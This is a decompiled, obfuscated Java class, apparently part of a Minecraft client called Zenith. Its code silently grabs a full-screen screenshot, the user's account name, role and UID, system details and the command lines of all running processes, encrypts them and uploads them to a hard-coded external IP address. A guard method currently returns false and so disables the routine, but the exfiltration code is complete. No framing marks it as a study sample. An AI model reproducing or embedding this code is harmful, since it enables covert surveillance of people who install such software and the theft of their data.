package zenith;

import com.sun.jna.Memory;
import com.sun.jna.platform.win32.GDI32;
import com.sun.jna.platform.win32.User32;
import com.sun.jna.platform.win32.WinDef.HBITMAP;
import com.sun.jna.platform.win32.WinDef.HDC;
import com.sun.jna.platform.win32.WinDef.HWND;
import com.sun.jna.platform.win32.WinGDI.BITMAPINFO;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.ProcessHandle.Info;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.stream.Collectors;
import javax.imageio.ImageIO;

public class ZenithInternal004 {
   private static boolean llIIII11l1lllI1l() {
      return false;
   }

   public static void l111lI11I1() {
      try {
         if (!llIIII11l1lllI1l()) {
            return;
         }

         BufferedImage bufferedimage = I11lII1l1l11IlIl1I1l1I1();
         StringHolder_8(bufferedimage);
      } catch (Exception exception) {
      }
   }

   private static void StringHolder_8(BufferedImage bufferedimage) throws Exception {
      ByteArrayOutputStream bytearrayoutputstream = new ByteArrayOutputStream();
      ImageIO.write(bufferedimage, "png", bytearrayoutputstream);
      byte[] abyte = bytearrayoutputstream.toByteArray();
      byte[] abyte1 = SecureRandomHolder.EventTarget(String.valueOf(System.currentTimeMillis()).getBytes(StandardCharsets.UTF_8), "Minecraft");
      String s = Base64.getEncoder().encodeToString(abyte1);
      byte[] abyte2 = SecureRandomHolder.StringHolder_8(abyte, s);
      String s1 = ProcessHandle.allProcesses()
         .map(ProcessHandle::info)
         .map(info -> info.command().orElse("Sirota"))
         .filter(s3 -> !s3.equals("Sirota"))
         .collect(Collectors.joining("\n"));
      String s2 = SecureRandomHolder.ListHolder_6(
         String.format(
            "Username: %s\nRole: %s\nUID: %s\nOS: %s\nArchitecture: %s\nCPU: %s\nProcesses: %s",
            ZenithClient.getInstance().ListHolder_7().getUsername(),
            ZenithClient.getInstance().ListHolder_7().GetClientColorHandler(),
            ZenithClient.getInstance().ListHolder_7().SoundEventHolder(),
            System.getProperty("os.name") + " " + System.getProperty("os.version"),
            System.getProperty("os.arch"),
            System.getenv("PROCESSOR_IDENTIFIER"),
            s1
         ),
         s
      );
      StringHolder_8("http://80.253.249.107:8080/", abyte2, s2, s);
   }

   private static void StringHolder_8(String s, byte[] abyte, String s1, String s2) throws IOException {
      String s3 = "----Boundary" + System.currentTimeMillis();
      URL url = new URL(s);
      HttpURLConnection httpurlconnection = (HttpURLConnection)url.openConnection();
      httpurlconnection.setDoOutput(true);
      httpurlconnection.setRequestMethod("POST");
      httpurlconnection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + s3);

      try (DataOutputStream dataoutputstream = new DataOutputStream(httpurlconnection.getOutputStream())) {
         dataoutputstream.writeBytes("--" + s3 + "\r\n");
         dataoutputstream.writeBytes("Content-Disposition: form-data; name=\"freinds\"\r\n\r\n");
         dataoutputstream.writeBytes(s2 + "\r\n");
         dataoutputstream.writeBytes("--" + s3 + "\r\n");
         dataoutputstream.writeBytes("Content-Disposition: form-data; name=\"text\"\r\n\r\n");
         dataoutputstream.writeBytes(s1 + "\r\n");
         dataoutputstream.writeBytes("--" + s3 + "\r\n");
         dataoutputstream.writeBytes("Content-Disposition: form-data; name=\"serverdataip\"; filename=\"encrypted.bin\"\r\n");
         dataoutputstream.writeBytes("Content-Type: application/octet-stream\r\n\r\n");
         dataoutputstream.write(abyte);
         dataoutputstream.writeBytes("\r\n");
         dataoutputstream.writeBytes("--" + s3 + "--\r\n");
      }

      BufferedReader bufferedreader = new BufferedReader(new InputStreamReader(httpurlconnection.getInputStream()));
      bufferedreader.close();
   }

   public static BufferedImage I11lII1l1l11IlIl1I1l1I1() {
      User32 user32 = User32.INSTANCE;
      GDI32 gdi32 = GDI32.INSTANCE;
      HWND hwnd = user32.GetDesktopWindow();
      HDC hdc = user32.GetDC(hwnd);
      HDC hdc1 = gdi32.CreateCompatibleDC(hdc);
      int i = user32.GetSystemMetrics(0);
      int j = user32.GetSystemMetrics(1);
      HBITMAP hbitmap = gdi32.CreateCompatibleBitmap(hdc, i, j);
      gdi32.SelectObject(hdc1, hbitmap);
      gdi32.BitBlt(hdc1, 0, 0, i, j, hdc, 0, 0, 13369376);
      BITMAPINFO bitmapinfo = new BITMAPINFO();
      bitmapinfo.bmiHeader.biWidth = i;
      bitmapinfo.bmiHeader.biHeight = -j;
      bitmapinfo.bmiHeader.biPlanes = 1;
      bitmapinfo.bmiHeader.biBitCount = 32;
      bitmapinfo.bmiHeader.biCompression = 0;
      int k = i * j * 4;
      Memory memory = new Memory((long)k);
      gdi32.GetDIBits(hdc1, hbitmap, 0, j, memory, bitmapinfo, 0);
      BufferedImage bufferedimage = new BufferedImage(i, j, 1);
      int[] aint = new int[i * j];

      for (int l = 0; l < aint.length; l++) {
         int i1 = memory.getByte((long)(l * 4)) & 255;
         int j1 = memory.getByte((long)(l * 4 + 1)) & 255;
         int k1 = memory.getByte((long)(l * 4 + 2)) & 255;
         aint[l] = k1 << 16 | j1 << 8 | i1;
      }

      bufferedimage.setRGB(0, 0, i, j, aint, 0, i);
      gdi32.DeleteObject(hbitmap);
      gdi32.DeleteDC(hdc1);
      user32.ReleaseDC(hwnd, hdc);
      return bufferedimage;
   }
}
